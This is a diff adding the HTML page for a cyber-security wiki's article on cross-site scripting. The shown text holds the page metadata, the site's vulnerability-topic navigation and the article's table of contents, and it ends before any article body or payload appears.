@@ -1,0 +1,3186 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Cross-Site Scripting (XSS) # Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is one of the most prevalent security issues in modern web applications and can lead to serious consequences including data theft, session hijacking, malware distribution, and unauthorized actions on behalf of authenticated users.
+Types of XSS Attacks # 1. Reflected XSS # Malicious script is reflected from the server response without being stored Typically delivered via crafted URLs, phishing emails, or malicious links Requires user interaction (clicking link, submitting form) Affects only users who access the malicious URL.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Cross-Site Scripting (XSS)" />
+<meta property="og:description" content="Cross-Site Scripting (XSS) # Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is one of the most prevalent security issues in modern web applications and can lead to serious consequences including data theft, session hijacking, malware distribution, and unauthorized actions on behalf of authenticated users.
+Types of XSS Attacks # 1. Reflected XSS # Malicious script is reflected from the server response without being stored Typically delivered via crafted URLs, phishing emails, or malicious links Requires user interaction (clicking link, submitting form) Affects only users who access the malicious URL." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
+<title>Cross-Site Scripting (XSS) | Cyber Security Wiki</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
+    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Application Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
+    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Thick Client</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/checklist/" class="">Checklist</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_linux/" class="">Learning Process - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/learningprocess_windows/" class="">Learning Process - Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_linux/" class="">Tools - Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/thick-client/tools_windows/" class="">Tools - Windows</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
+    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Vulnerable Applications</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/Api/" class="">API</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/Vulnerable-Applications/WebApp/" class="">Web App</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
+    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Web</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Account-Takeover/" class="">Account Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Access-Control/" class="">Broken Access Control</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Broken-Function-Level-Authorization-BFLA/" class="">Broken Function Level Authorization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Buffer-Overflow/" class="">Buffer Overflow</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Business-logic-Vulnerabilities/" class="">Business Logic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/charset-xss/" class="">Charset XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Clickjacking/" class="">Clickjacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Client-Side-Template-Injection-CSTI/" class="">Client Side Template Injection (CSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CORS/" class="">CORS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Credential-Stuffing/" class="">Credential Stuffing</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CRLF-Injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Request-Forgery-CSRF/" class="">Cross-Site Request Forgery (CSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Cross-Site-Scripting-XSS/" class=" active">Cross-Site Scripting (XSS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/CSV-Injection/" class="">CSV Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" class="">Denial of Service (DOS)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" class="">DOM Clobbering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/GraphQL/" class="">GraphQL</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Host-Header-Injection/" class="">HTTP Host Header Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/HTTP-Request-Smuggling/" class="">HTTP Request Smuggling</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Identification-and-Authentication-Failures/" class="">Identification and Authentication Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Disclosure/" class="">Information Disclosure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Information-Gathering/" class="">Information Gathering</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" class="">Insecure Deserialization</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insecure-Direct-Object-Reference-IDOR/" class="">Insecure Direct Object Reference (IDOR)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Insufficient-Transport-Layer-Protection/" class="">Insufficient Transport Layer Protection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/JWT/" class="">JWT</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/LDAP-Injection/" class="">LDAP Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Mass-Assignment/" class="">Mass Assignment</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/MFA-Bypass/" class="">Multi-Factor Authentication (MFA) Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/NoSQL-Injection/" class="">NoSQL Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/OAuth-Cheatsheet/" class="">OAuth (Open Authorization)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Open-Redirect/" class="">Open Redirect</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Padding-Oracle-Attacks/" class="">Padding Oracle Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Privilege-Escalation-Horizontal-Vertical/" class="">Privilege Escalation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Prototype-Pollution/" class="">Prototype Pollution</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Race-Conditions/" class="">Race Conditions</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Rate-Limiting/" class="">Rate Limiting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="">Registration / Signup Logic Flaws</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Logging-and-Monitoring-Failures/" class="">Security Logging and Monitoring Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Security-Misconfiguration/" class="">Security Misconfiguration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Sensitive-Data-Exposure/" class="">Sensitive Data Exposure</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Request-Forgery-SSRF/" class="">Server-Side Request Forgery (SSRF)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Server-Side-Template-Injection-SSTI/" class="">Server-Side Template Injection (SSTI)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" class="">Session Management Weaknesses</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Software-Data-Integrity-Failures/" class="">Software &amp; Data Integrity Failures</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Subdomain-Takeover/" class="">Subdomain Takeover</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Third-party-service-integration-issues/" class="">Third party service integration issues</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Token-Predictability-Issues-Cheatsheet/" class="">Token Predictability / Poor Randomness</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Unrestricted-Resource-Consumption/" class="">Unrestricted Resource Consumption</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Vulnerable-Outdated-Components/" class="">Vulnerable &amp; Outdated Components</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-Cryptography-Implementation/" class="">Weak Cryptography Implementation</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Weak-SSL-TLS-Configurations/" class="">Weak SSL/TLS Configurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Deception/" class="">Web Cache Deception</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/Web-Cache-Poisoning/" class="">Web Cache Poisoning</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XPath-Injection/" class="">XPath Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/application-security/web/XXE-XML-External-Entities/" class="">XXE (XML External Entities)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
+    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Cloud Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
+    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">DevSecOps</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
+    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Exploit Development</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
+    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">IoT Security</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
+    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Machine Learning</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="https://cyber-security.wiki/docs/machine-learning/learning/" class="">Learning Process</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
+    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Network</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
+    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Red Teaming</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <br>
+    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
+    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+      <a role="button" class="">Threat Modelling</a>
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+<hr>
+<b>
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/contribute/" >
+        Contribute
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://securecode.wiki" target="_blank" rel="noopener">
+        Secure Code Wiki by Payatu
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</b>
+</nav>
+
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Cross-Site Scripting (XSS)</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a>
+      <ul>
+        <li><a href="#types-of-xss-attacks">Types of XSS Attacks</a>
+          <ul>
+            <li><a href="#1-reflected-xss">1. Reflected XSS</a></li>
+            <li><a href="#2-stored-xss">2. Stored XSS</a></li>
+            <li><a href="#3-dom-based-xss">3. DOM-Based XSS</a></li>
+            <li><a href="#sources">Sources:</a></li>
+            <li><a href="#sinks">Sinks:</a></li>
+            <li><a href="#examples">Examples:</a></li>
+          </ul>
+        </li>
+        <li><a href="#common-xss-vectors">Common XSS Vectors:</a>
+          <ul>
+            <li><a href="#user-input-injection-points">User Input Injection Points</a></li>
+          </ul>
+        </li>
+        <li><a href="#testing-for-xss-"><strong>Testing for XSS :</strong></a>
+          <ul>
+            <li><a href="#1-manual-fuzzing"><strong>1. Manual Fuzzing</strong></a></li>
+            <li><a href="#2-automated-scanners"><strong>2. Automated Scanners</strong></a></li>
+            <li><a href="#3-code-review"><strong>3. Code Review</strong></a></li>
+            <li><a href="#4-realistic-attack-simulations"><strong>4. Realistic Attack Simulations</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#basic-xss-contexts--breakouts">Basic XSS Contexts &amp; Breakouts</a>
+          <ul>
+            <li><a href="#html-context">HTML Context:</a></li>
+            <li><a href="#attribute-context">Attribute Context</a></li>
+            <li><a href="#javascript-context">JavaScript Context</a></li>
+            <li><a href="#url-context">URL Context</a></li>
+            <li><a href="#event-handlers">Event Handlers</a></li>
+          </ul>
+        </li>
+        <li><a href="#blind-xss"><strong>Blind XSS</strong></a>
+          <ul>
+            <li><a href="#key-characteristics"><strong>Key Characteristics</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#detecting-blind-xss"><strong>Detecting Blind XSS</strong></a></li>
+        <li><a href="#exploiting-blind-xss"><strong>Exploiting Blind XSS</strong></a></li>
+        <li><a href="#blind-xss-payloads"><strong>Blind XSS Payloads</strong></a>
+          <ul>
+            <li><a href="#1-image-only-html-injection-check"><strong>1. Image-only (HTML Injection Check)</strong></a></li>
+            <li><a href="#2-image-tag-blind-xss"><strong>2. Image-tag Blind XSS</strong></a></li>
+            <li><a href="#3-dns-based-blind-xss"><strong>3. DNS-based Blind XSS</strong></a></li>
+            <li><a href="#4-iframe-based-blind-xss"><strong>4. iframe-based Blind XSS</strong></a></li>
+            <li><a href="#5-object-tag-blind-xss"><strong>5. Object-tag Blind XSS</strong></a></li>
+            <li><a href="#6-input-field-blind-xss"><strong>6. Input-field Blind XSS</strong></a></li>
+            <li><a href="#7-script-tag-callbacks"><strong>7. Script-tag Callbacks</strong></a></li>
+            <li><a href="#8-javascript-uri-scheme"><strong>8. JavaScript URI Scheme</strong></a></li>
+            <li><a href="#9-advanced-svg-blind-xss"><strong>9. Advanced SVG Blind XSS</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#modern-attack-surfaces">Modern Attack Surfaces</a>
+          <ul>
+            <li><a href="#1-single-page-applications-spas"><strong>1. Single Page Applications (SPAs)</strong></a></li>
+            <li><a href="#2-websockets"><strong>2. WebSockets</strong></a></li>
+            <li><a href="#3-server-side-rendering-ssr"><strong>3. Server-Side Rendering (SSR)</strong></a></li>
+            <li><a href="#4-graphql"><strong>4. GraphQL</strong></a></li>
+            <li><a href="#5-web-components"><strong>5. Web Components</strong></a></li>
+            <li><a href="#6-pdf-generators"><strong>6. PDF Generators</strong></a></li>
+            <li><a href="#7-postmessage-attacks"><strong>7. <code>postMessage</code> Attacks</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#bypassing-modern-defenses">Bypassing Modern Defenses</a>
+          <ul>
+            <li><a href="#filter-evasion"><strong>Filter Evasion</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#csp-bypass-techniques"><strong>CSP Bypass Techniques</strong></a>
+          <ul>
+            <li><a href="#1-inline-javascript-allowed-unsafe-inline"><strong>1. Inline JavaScript Allowed (<code>unsafe-inline</code>)</strong></a></li>
+            <li><a href="#2-dangerous-unsafe-eval-enabled"><strong>2. Dangerous <code>unsafe-eval</code> Enabled</strong></a></li>
+            <li><a href="#3-wildcard-in-script-src"><strong>3. Wildcard in <code>script-src</code></strong></a></li>
+            <li><a href="#4-missing-object-src-and-default-src"><strong>4. Missing <code>object-src</code> and <code>default-src</code></strong></a></li>
+            <li><a href="#5-jsonp-endpoint-allowed-in-script-src"><strong>5. JSONP Endpoint Allowed in <code>script-src</code></strong></a></li>
+            <li><a href="#6-csp-bypass-using-file-upload-functionality"><strong>6. CSP Bypass Using File Upload Functionality</strong></a></li>
+            <li><a href="#7-bypassing-csp-in-angularjs"><strong>7. Bypassing CSP in AngularJS</strong></a></li>
+            <li><a href="#8-bypass-via-open-redirect-in-whitelisted-domain"><strong>8. Bypass via Open Redirect in Whitelisted Domain</strong></a></li>
+            <li><a href="#9-encoding--to-bypass-directory-restricted-csp"><strong>9. Encoding <code>/</code> to Bypass Directory-Restricted CSP</strong></a></li>
+            <li><a href="#10-csp-bypass-using-open-redirect--jsonp-chained-attack"><strong>10. CSP Bypass Using Open Redirect + JSONP (Chained Attack)</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#event-handler-bypass"><strong>Event Handler Bypass</strong></a></li>
+        <li><a href="#advanced-xss-scenarios">Advanced XSS Scenarios</a>
+          <ul>
+            <li><a href="#1-phantomjs-html-injection--xss--ssrflfr">1. PhantomJS HTML Injection → XSS → SSRF/LFR</a></li>
+            <li><a href="#2-csrf--xss-chaining"><strong>2. CSRF + XSS Chaining</strong></a></li>
+            <li><a href="#core-idea"><strong>Core Idea:</strong></a></li>
+            <li><a href="#chaining-logic-"><strong>Chaining Logic :</strong></a></li>
+            <li><a href="#1-use-xss-to-run-malicious-js"><strong>1. Use XSS to run malicious JS</strong></a></li>
+            <li><a href="#2-use-csrf-to-submit-authenticated-requests"><strong>2. Use CSRF to submit authenticated requests</strong></a></li>
+            <li><a href="#3-use-csrf-to-plant-xss-into-a-stored-field"><strong>3. Use CSRF to plant XSS into a stored field</strong></a></li>
+            <li><a href="#4-resulting-chain"><strong>4. Resulting chain</strong></a></li>
+            <li><a href="#3-bypass-httponly--xss-escalation">3. Bypass HttpOnly → XSS Escalation</a></li>
+            <li><a href="#4-xss-in-chatbot-message-renderer"><strong>4. XSS in Chatbot Message Renderer</strong></a></li>
+            <li><a href="#summary"><strong>Summary</strong></a></li>
+            <li><a href="#root-cause"><strong>Root Cause</strong></a></li>
+            <li><a href="#how-vulnerability-was-found"><strong>How Vulnerability Was Found</strong></a></li>
+            <li><a href="#payload-"><strong>Payload :</strong></a></li>
+            <li><a href="#impact"><strong>Impact</strong></a></li>
+            <li><a href="#exploit-flow"><strong>Exploit Flow</strong></a></li>
+            <li><a href="#5-stored-xss-in-gitlab-user-profile"><strong>5. Stored XSS in GitLab User Profile</strong></a></li>
+            <li><a href="#root-cause-1"><strong>Root Cause</strong></a></li>
+            <li><a href="#injection-point"><strong>Injection Point</strong></a></li>
+            <li><a href="#exploit-flow-1"><strong>Exploit Flow:</strong></a></li>
+            <li><a href="#1-attacker-edits-profile"><strong>1. Attacker edits profile</strong></a></li>
+            <li><a href="#2-server-stores-payload-in-db"><strong>2. Server stores payload in DB</strong></a></li>
+            <li><a href="#3-admin-opens-attackers-profile"><strong>3. Admin opens attacker’s profile</strong></a></li>
+            <li><a href="#4-script-executes-in-admins-browser"><strong>4. Script executes in admin’s browser</strong></a></li>
+            <li><a href="#5-attacker-gains-control"><strong>5. Attacker gains control</strong></a></li>
+            <li><a href="#its-of-high-impact"><strong>It’s of High Impact</strong></a></li>
+            <li><a href="#potential-payloads"><strong>Potential Payloads</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#framework-specific-vectors">Framework-Specific Vectors</a>
+          <ul>
+            <li><a href="#1-vuejs">1. Vue.js</a></li>
+            <li><a href="#vuejs--prototype-pollution--xss-cve-2024-6783"><strong>Vue.js – Prototype Pollution → XSS (CVE-2024-6783)</strong></a></li>
+            <li><a href="#flow-of-attack-">Flow of Attack :</a></li>
+            <li><a href="#payloads-"><strong>Payloads :</strong></a></li>
+            <li><a href="#2-angularjs">2. AngularJS</a></li>
+            <li><a href="#angularjs--expression-sandbox-escape"><strong>AngularJS – Expression Sandbox Escape</strong></a></li>
+            <li><a href="#flow-of-attack--1"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payload--1"><strong>Payload :</strong></a></li>
+            <li><a href="#3-react">3. React</a></li>
